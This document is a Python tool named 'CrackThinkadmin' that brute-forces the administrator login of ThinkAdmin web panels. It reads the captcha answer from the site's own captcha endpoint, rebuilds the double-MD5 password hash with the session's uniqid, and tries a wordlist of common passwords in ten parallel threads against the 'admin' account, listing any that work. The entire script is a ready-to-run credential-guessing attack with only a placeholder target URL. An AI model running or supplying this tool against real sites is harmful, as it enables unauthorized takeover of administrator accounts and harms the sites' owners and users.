# -*- coding: utf-8 -*
# *python3*
# *author : b8s*

import requests
import hashlib
import json
import re
import fileinput
from bs4 import BeautifulSoup
import warnings
from colorama import Fore, Style, init
import concurrent.futures
import threading
from alive_progress import alive_bar


def head():
    print("\033[1;32;40m\n"
          "██████╗  █████╗ ███████╗\n"
          "██╔══██╗██╔══██╗██╔════╝\n"
          "██████╔╝╚█████╔╝███████╗\n"
          "██╔══██╗██╔══██╗╚════██║\n"
          "██████╔╝╚█████╔╝███████║\n"
          "╚═════╝  ╚════╝ ╚══════╝\n"
          "                         \n"
          "                         \n"
          "                         \n"
          "    author       b8s      \n"
          "     CrackThinkadmin      \n"
          "\033[0m")


# 禁用InsecureRequestWarning警告
warnings.filterwarnings(
    'ignore', message='Unverified HTTPS request is being made.')

# 初始化colorama，以便在命令行中打印不同颜色的文本
init()

# 定义ThinkAdmin的URL地址
urls = "https://yourtarget.com"

# 创建锁，用于保证线程安全
lock = threading.Lock()


def create_md5(pwd):
    # 接收一个字符串参数pwd，计算其MD5哈希值，并返回结果
    md5_obj = hashlib.md5()
    md5_obj.update(pwd.encode("utf-8"))
    return md5_obj.hexdigest()


def get_headers():
    # 定义函数get_headers，获取请求头信息
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36'
    }
    url = f"{urls}/admin/login.html"
    response = requests.get(url, headers=headers, verify=False)
    cookies = response.headers.get('Set-Cookie', '')
    ssid_match = re.search(r'ssid=[a-zA-Z0-9]+', cookies)
    ssid = ssid_match.group(0) if ssid_match else ''
    headers['Cookie'] = ssid
    return headers


def token(headers):
    # 定义函数token，用于获取验证码的token值
    url = f"{urls}/admin/login.html"
    html = requests.get(url, headers=headers, verify=False)
    soup = BeautifulSoup(html.text, "html.parser")
    token_element = soup.find('label', {'data-captcha-type': 'LoginCaptcha'})
    return token_element.get('data-captcha-token') if token_element else None


def value(headers):
    # 定义函数value，获取验证码的uniqid和code
    url = f"{urls}/admin/login/captcha"
    d = {'type': 'LoginCaptcha', 'token': token(headers)}
    html = requests.post(url, data=d, headers=headers, verify=False)
    data = json.loads(html.text).get('data', {})
    return data.get('uniqid'), data.get('code')


def login(pwd, headers, success):
    # 定义函数login，用于尝试登录
    try:
        url = f"{urls}/admin/login.html"
        uniqid, code = value(headers)
        pwd_md5 = create_md5(pwd)
        final_pwd = create_md5(pwd_md5 + uniqid)
        d = {
            'username': 'admin',
            'password': final_pwd,
            'verify': code,
            'uniqid': uniqid
        }
        html = requests.post(url, data=d, headers=headers, verify=False)
        response_text = html.text.strip()
        if response_text:
            response_data = json.loads(response_text)
            info = response_data.get('info')

            if info == '登录成功':
                # 上锁，保证线程安全
                with lock:
                    success.append(pwd)
                return True
        return False
    except Exception as e:
        return False


def run_login(pwd):
    headers = get_headers()
    return login(pwd.strip(), headers, success)


# 定义一个列表，用于保存所有成功的密码
success = []

# banner
head()

# 启动线程池
with fileinput.input(files=(r'./somd5-top1w.txt'), openhook=fileinput.hook_encoded("utf-8")) as f:
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_pwd = {executor.submit(
            run_login, line.strip()): line.strip() for line in f}
        with alive_bar(len(future_to_pwd)) as bar:
            for future in concurrent.futures.as_completed(future_to_pwd):
                pwd = future_to_pwd[future]
                try:
                    future.result()
                except Exception as e:
                    pass
                bar()

if success:
    print(f"\n{Fore.GREEN}[I]  登录成功的密码：")
    for pwd in success:
        print(f"{pwd}{Style.RESET_ALL}")
